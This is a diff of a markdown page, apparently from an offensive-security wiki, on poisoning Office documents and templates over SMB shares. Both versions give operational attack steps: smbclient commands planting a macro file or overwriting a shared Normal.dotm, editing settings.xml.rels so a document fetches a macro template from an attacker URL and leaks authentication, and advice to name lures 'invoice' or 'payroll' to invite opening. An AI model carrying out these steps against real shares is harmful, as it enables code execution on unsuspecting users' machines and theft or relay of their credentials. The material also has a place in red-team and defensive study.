@@ -1,33 +1,41 @@
 ---
-title: "Office and template poisoning: run code when a shared document opens"
-description: "Planting or modifying Office files on a writable share so the next user who opens them runs attacker code: macro-enabled documents, remote-template injection that fetches a macro at open time, and poisoning a shared normal.dotm template or add-in used across the team."
+title: "Office and template poisoning: execution when a user opens a document"
+description: "Office documents on a writable share execute attacker content when a user opens them: macro-enabled documents run their VBA, and the global and workgroup templates (Normal.dotm, startup folders) run on every launch. Remote-template and external-reference injection additionally pulls attacker content from a server when a benign-looking document opens."
 keywords:
   - macro
-  - remote template injection
   - normal.dotm
-  - Office add-in
-  - document poisoning
+  - remote template
+  - office poisoning
+  - startup templates
 ---
 
 # Office and template poisoning
 
-Shared folders hold the documents a team opens every day, which makes them a delivery channel. An attacker with write access plants a macro-enabled file, injects a remote template reference into an existing document so it fetches a macro at open time, or poisons a shared template (`normal.dotm`) or add-in that Office loads automatically for everyone who uses it.
+Office documents stored on a writable share become execution triggers when users open them. The direct form is a macro-enabled document whose VBA runs on open (subject to the user's macro settings). The more insidious form targets templates: Word's `Normal.dotm` and the Office startup folders hold code and settings loaded on every launch, so poisoning a shared or roaming template runs on each start. And remote-template or external-reference injection makes an otherwise clean document fetch and execute attacker content from a server when it opens, which also coerces authentication.
+
+## Routes
 
 ```bash
-# Inject a remote template reference into an existing .docx on the share
-# (document.xml.rels Target points at the attacker's macro template)
-unzip doc.docx word/_rels/settings.xml.rels   # edit Target=http(s)://attacker/t.dotm
-# Or replace a shared template that Office autoloads
-smbclient //<target>/share -U user%pass -c 'cd Templates; put evil.dotm Normal.dotm'
+# 1. macro document on the share (runs VBA on open if macros are allowed)
+smbclient //<t>/share -U 'user%pass' -c 'put invoice.xlsm'
+# 2. poison a shared/roaming template so code runs on every Office launch
+#    Normal.dotm (Word), or files in the Office STARTUP folder, if share-hosted
+smbclient //<t>/profiles -U 'user%pass' -c 'cd Templates; put Normal.dotm'
+# 3. remote-template injection: a .docx references an external template URL the
+#    attacker controls; opening the doc fetches template.dotm (code + auth)
+#    edit word/_rels/settings.xml.rels Target to http(s)://attacker/template.dotm
 ```
+
+Remote-template injection works because an Office Open XML document records the template it is based on as a relationship target; changing that target to an attacker URL makes the client fetch the remote template on open, which can carry a macro and forces the client to request the URL (leaking or relaying authentication if it is UNC/HTTP).
 
 ## Exploitation notes
 
-- Remote-template injection keeps the document looking normal and fetches the payload only at open, which evades static inspection of the file on the share.
-- A poisoned shared `normal.dotm` or startup add-in runs for every user who opens Office against that path, a broad foothold.
-- Macro execution depends on the victim's Office macro policy; target teams where macros are enabled for shared templates.
+- Macro execution depends on the user's macro policy; template poisoning (`Normal.dotm`, STARTUP) is stronger where those are share-hosted because it runs on every launch regardless of per-document prompts.
+- Remote-template injection doubles as coercion: a UNC or HTTP template target makes the client authenticate to the attacker, combining with [signing and relay](../signing-and-relay.md).
+- Name the poisoned document to invite opening (invoice, report, payroll) and place it where the target user works; execution is in that user's context.
+- This triggers on open rather than on folder browse; use [SCF and LNK coercion](scf-and-lnk-coercion.md) for the browse-only case.
 
 ## References
 
-- [HackTricks: phishing documents](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/phishing-methodology/phishing-documents.html)
-- [Microsoft: Office template and add-in startup](https://learn.microsoft.com/en-us/office/vba/library-reference/concepts/startup-folders)
+- [MITRE ATT&CK: template injection](https://attack.mitre.org/techniques/T1221/)
+- [MITRE ATT&CK: office application startup](https://attack.mitre.org/techniques/T1137/)
